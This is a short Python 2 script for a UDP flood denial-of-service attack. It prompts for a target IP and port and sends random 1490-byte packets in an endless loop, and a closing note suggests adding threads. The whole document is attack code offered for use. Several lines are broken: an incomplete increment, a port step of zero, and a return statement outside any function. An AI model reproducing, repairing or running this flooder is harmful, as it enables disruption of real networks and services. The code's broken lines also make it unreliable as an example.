
```python
import os
import sys
import time
import socket
import random

ip = raw_input('IP    : ')
port = input('Port  : ')
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
send = 0
while True:
    sock.sendto(bytes, (ip, port))
    send = send + 
    port = port + 0
    print 'send %s packet on %s port %s' % (send, ip, port)
    if port == 65534:
        port = 0
        continue
    return None
```

## Improvements

(Maybe use threads ?)